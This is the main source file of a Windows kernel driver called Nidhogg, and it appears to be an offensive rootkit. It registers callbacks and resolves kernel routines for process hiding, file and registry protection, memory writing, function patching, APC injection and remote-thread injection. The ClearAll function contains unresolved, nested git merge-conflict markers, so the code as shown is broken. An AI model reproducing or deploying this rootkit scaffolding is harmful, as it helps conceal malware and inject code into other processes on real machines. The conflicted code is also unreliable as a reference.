#include "pch.h"
#include "Nidhogg.h"

extern "C"
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
#ifdef DRIVER_REFLECTIVELY_LOADED
	UNREFERENCED_PARAMETER(DriverObject);
	UNREFERENCED_PARAMETER(RegistryPath);
	Features.DriverReflectivelyLoaded = true;
	Features.ProcessProtection = false;
	Features.ThreadProtection = false;
	Features.RegistryFeatures = false;
	KdPrint((DRIVER_PREFIX "Driver is being reflectively loaded...\n"));

	UNICODE_STRING driverName = RTL_CONSTANT_STRING(DRIVER_NAME);
	UNICODE_STRING routineName = RTL_CONSTANT_STRING(L"IoCreateDriver");
	tIoCreateDriver IoCreateDriver = (tIoCreateDriver)MmGetSystemRoutineAddress(&routineName);

	if (!IoCreateDriver)
		return STATUS_INCOMPATIBLE_DRIVER_BLOCKED;

	NTSTATUS status = IoCreateDriver(&driverName, &NidhoggEntry);

	if (!NT_SUCCESS(status))
		KdPrint((DRIVER_PREFIX "Failed to create driver: (0x%08X)\n", status));
	return status;
#endif

	return NidhoggEntry(DriverObject, RegistryPath);
}

/*
* Description:
* NidhoggEntry is responsible for handling the driver loading process.
*
* Parameters:
* @DriverObject [PDRIVER_OBJECT]  -- The driver object contains a lot of important driver configuration such as DeviceObject, MajorFunctions and more.
* @RegistryPath [PUNICODE_STRING] -- The driver's associated registry path, unused.
*
* Returns:
* @status		[NTSTATUS]		  -- Whether the driver is loaded successfuly or not.
*/
NTSTATUS NidhoggEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
	UNREFERENCED_PARAMETER(RegistryPath);
	NTSTATUS status = STATUS_SUCCESS;

	InitializeFeatures();

	// Setting up the device object.
	UNICODE_STRING deviceName = RTL_CONSTANT_STRING(DRIVER_DEVICE_NAME);
	UNICODE_STRING symbolicLink = RTL_CONSTANT_STRING(DRIVER_SYMBOLIC_LINK);
	UNICODE_STRING altitude = RTL_CONSTANT_STRING(OB_CALLBACKS_ALTITUDE);
	UNICODE_STRING regAltitude = RTL_CONSTANT_STRING(REG_CALLBACK_ALTITUDE);
	PDEVICE_OBJECT DeviceObject = nullptr;

	// Creating device and symbolic link.
	status = IoCreateDevice(DriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &DeviceObject);

	if (!NT_SUCCESS(status)) {
		KdPrint((DRIVER_PREFIX "Failed to create device: (0x%08X)\n", status));
		return status;
	}

	status = IoCreateSymbolicLink(&symbolicLink, &deviceName);

	if (!NT_SUCCESS(status)) {
		KdPrint((DRIVER_PREFIX "Failed to create symbolic link: (0x%08X)\n", status));
		IoDeleteDevice(DeviceObject);
		return status;
	}

	// Registering the process callback function only if the driver isn't reflectively loaded (to avoid BSOD).
	if (!Features.DriverReflectivelyLoaded) {
		OB_OPERATION_REGISTRATION operations[] = {
		{
			PsProcessType,
			OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE,
			OnPreOpenProcess, nullptr
		},
		{
			PsThreadType,
			OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE,
			OnPreOpenThread, nullptr
		}
		};
		OB_CALLBACK_REGISTRATION registrationCallbacks = {
			OB_FLT_REGISTRATION_VERSION,
			REGISTERED_OB_CALLBACKS,
			RTL_CONSTANT_STRING(OB_CALLBACKS_ALTITUDE),
			nullptr,
			operations
		};

		status = ObRegisterCallbacks(&registrationCallbacks, &RegistrationHandle);

		if (!NT_SUCCESS(status)) {
			KdPrint((DRIVER_PREFIX "Failed to register process callback: (0x%08X)\n", status));
			status = STATUS_SUCCESS;
			Features.ProcessProtection = false;
			Features.ThreadProtection = false;
		}

		status = CmRegisterCallbackEx(OnRegistryNotify, &regAltitude, DriverObject, nullptr, &rGlobals.RegCookie, nullptr);

		if (!NT_SUCCESS(status)) {
			KdPrint((DRIVER_PREFIX "Failed to register registry callback: (0x%08X)\n", status));
			status = STATUS_SUCCESS;
			Features.RegistryFeatures = false;
		}
	}
	else {
		DeviceObject->Flags |= DO_BUFFERED_IO;
		DeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;
	}

	// Setting up functions.
	DriverObject->DriverUnload = NidhoggUnload;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = DriverObject->MajorFunction[IRP_MJ_CLOSE] = NidhoggCreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = NidhoggDeviceControl;

	KdPrint((DRIVER_PREFIX "Initialization finished.\n"));
	return status;
}

/*
* Description:
* NidhoggUnload is responsible for handling the driver unloading process which includes: Removing all hooks, deleting the symbolic link and the deviceobject.
*
* Parameters:
* @DriverObject [PDRIVER_OBJECT] -- The driver object contains a lot of important driver configuration such as DeviceObject, MajorFunctions and more.
*
* Returns:
* There is no return value.
*/
void NidhoggUnload(PDRIVER_OBJECT DriverObject) {
	KdPrint((DRIVER_PREFIX "Unloading...\n"));

	if (Features.RegistryFeatures) {
		NTSTATUS status = CmUnRegisterCallback(rGlobals.RegCookie);

		if (!NT_SUCCESS(status)) {
			KdPrint((DRIVER_PREFIX "Failed to unregister registry callbacks: (0x%08X)\n", status));
		}
	}

	ClearAll();

	// To avoid BSOD.
	if (Features.ThreadProtection && Features.ProcessProtection && RegistrationHandle) {
		ObUnRegisterCallbacks(RegistrationHandle);
		RegistrationHandle = NULL;
	}

	UNICODE_STRING symbolicLink = RTL_CONSTANT_STRING(DRIVER_SYMBOLIC_LINK);
	IoDeleteSymbolicLink(&symbolicLink);
	IoDeleteDevice(DriverObject->DeviceObject);
}

/*
* Description:
* CompleteIrp is responsible for handling the status return via the IRP.
*
* Parameters:
* @Irp	   [PIRP]	   -- The IRP that contains the request's status.
* @status  [NTSTATUS]  -- The status to assign to the IRP.
* @info    [ULONG_PTR] -- Additional information to assign to the IRP.
*
* Returns:
* @status [NTSTATUS]   -- The given status parameter.
*/
NTSTATUS CompleteIrp(PIRP Irp, NTSTATUS status, ULONG_PTR info) {
	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = info;
	IoCompleteRequest(Irp, 0);
	return status;
}

/*
* Description:
* NidhoggCreateClose is responsible for creating a success response for given IRP.
*
* Parameters:
* @DeviceObject [PDEVICE_OBJECT] -- Not used.
* @Irp			[PIRP]			 -- The IRP that contains the user data such as SystemBuffer, Irp stack, etc.
*
* Returns:
* @status		[NTSTATUS]		 -- Always will be STATUS_SUCCESS.
*/
NTSTATUS NidhoggCreateClose(PDEVICE_OBJECT, PIRP Irp) {
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

/*
* Description:
* ClearAll is responsible for freeing all allocated memory and cleaning all the globals.
*
* Parameters:
* There are no parameters.
*
* Returns:
* There is no return value.
*/
void ClearAll() {
	// Clearing the process array.
	AutoLock processProtectingLocker(pGlobals.Lock);

<<<<<<< HEAD
<<<<<<< HEAD
	memset(&pGlobals.Processes.Pids, 0, sizeof(pGlobals.Processes.Pids));
	pGlobals.Processes.PidsCount = 0;
=======
	memset(&pGlobals.Pids, 0, sizeof(pGlobals.Pids));
	pGlobals.PidsCount = 0;
>>>>>>> 0a9676d (Pre version 0.1 (#6))
=======
	memset(&pGlobals.ProtectedProcesses.Processes, 0, sizeof(pGlobals.ProtectedProcesses.Processes));
	pGlobals.ProtectedProcesses.PidsCount = 0;
>>>>>>> 39effc7 (PPID Spoofing initial)

	for (int i = 0; i < pGlobals.HiddenProcesses.PidsCount; i++) {
		pGlobals.HiddenProcesses.Processes[i].ListEntry = NULL;
		pGlobals.HiddenProcesses.Processes[i].Pid = 0;
	}
	pGlobals.HiddenProcesses.PidsCount = 0;

	// Clearing the thread array.
	AutoLock threadProtectingLocker(tGlobals.Lock);

	memset(&tGlobals.ProtectedThreads.Threads, 0, sizeof(tGlobals.ProtectedThreads.Threads));
	tGlobals.ProtectedThreads.TidsCount = 0;

	// Clearing the files array.
	AutoLock filesLocker(fGlobals.Lock);

	for (int i = 0; i < fGlobals.Files.FilesCount; i++) {
		ExFreePoolWithTag(fGlobals.Files.FilesPath[i], DRIVER_TAG);
		fGlobals.Files.FilesPath[i] = nullptr;
		fGlobals.Files.FilesCount--;
	}

	// Uninstalling NTFS hooks if there are any.
	if (fGlobals.Callbacks[0].Activated)
		UninstallNtfsHook(IRP_MJ_CREATE);

	// Clearing the registry keys and values.
	AutoLock registryLocker(rGlobals.Lock);

	for (int i = 0; i < rGlobals.ProtectedItems.Keys.KeysCount; i++) {
		ExFreePoolWithTag(rGlobals.ProtectedItems.Keys.KeysPath[i], DRIVER_TAG);
		rGlobals.ProtectedItems.Keys.KeysPath[i] = nullptr;
	}
	rGlobals.ProtectedItems.Keys.KeysCount = 0;

	for (int i = 0; i < rGlobals.ProtectedItems.Values.ValuesCount; i++) {
		ExFreePoolWithTag(rGlobals.ProtectedItems.Values.ValuesPath[i], DRIVER_TAG);
		ExFreePoolWithTag(rGlobals.ProtectedItems.Values.ValuesName[i], DRIVER_TAG);
		rGlobals.ProtectedItems.Values.ValuesPath[i] = nullptr;
		rGlobals.ProtectedItems.Values.ValuesName[i] = nullptr;
	}
	rGlobals.ProtectedItems.Values.ValuesCount = 0;
}

/*
* Description:
* InitializeFeatures is responsible for initializing the features and the globals.
*
* Parameters:
* There are no parameters.
*
* Returns:
* There is no return value.
*/
void InitializeFeatures() {
	UNICODE_STRING routineName;

	// Initialize globals.
	tGlobals.Init();
	pGlobals.Init();
	fGlobals.Init();
	rGlobals.Init();

	// Initialize functions.
	RtlInitUnicodeString(&routineName, L"MmCopyVirtualMemory");
	MmCopyVirtualMemory = (tMmCopyVirtualMemory)MmGetSystemRoutineAddress(&routineName);

	if (!MmCopyVirtualMemory)
		Features.ReadData = false;

	RtlInitUnicodeString(&routineName, L"ZwProtectVirtualMemory");
	ZwProtectVirtualMemory = (tZwProtectVirtualMemory)MmGetSystemRoutineAddress(&routineName);

	if (!ZwProtectVirtualMemory || !Features.ReadData)
		Features.WriteData = false;

	RtlInitUnicodeString(&routineName, L"PsGetProcessPeb");
	PsGetProcessPeb = (tPsGetProcessPeb)MmGetSystemRoutineAddress(&routineName);

	if (!Features.WriteData || !PsGetProcessPeb)
		Features.FunctionPatching = false;

	RtlInitUnicodeString(&routineName, L"ObReferenceObjectByName");
	ObReferenceObjectByName = (tObReferenceObjectByName)MmGetSystemRoutineAddress(&routineName);

	if (!ObReferenceObjectByName)
		Features.FileProtection = false;

	RtlInitUnicodeString(&routineName, L"KeInitializeApc");
	KeInitializeApc = (tKeInitializeApc)MmGetSystemRoutineAddress(&routineName);
	RtlInitUnicodeString(&routineName, L"KeInsertQueueApc");
	KeInsertQueueApc = (tKeInsertQueueApc)MmGetSystemRoutineAddress(&routineName);
	RtlInitUnicodeString(&routineName, L"KeTestAlertThread");
	KeTestAlertThread = (tKeTestAlertThread)MmGetSystemRoutineAddress(&routineName);
	RtlInitUnicodeString(&routineName, L"ZwQuerySystemInformation");
	ZwQuerySystemInformation = (tZwQuerySystemInformation)MmGetSystemRoutineAddress(&routineName);

	if (!KeInitializeApc || !KeInsertQueueApc || !KeTestAlertThread || !ZwQuerySystemInformation)
		Features.ApcInjection = false;

	if (NT_SUCCESS(GetSSDTAddress())) {
		NtCreateThreadEx = (tNtCreateThreadEx)GetSSDTFunctionAddress("NtCreateThreadEx");

		if (NtCreateThreadEx)
			Features.CreateThreadInjection = true;
	}
}
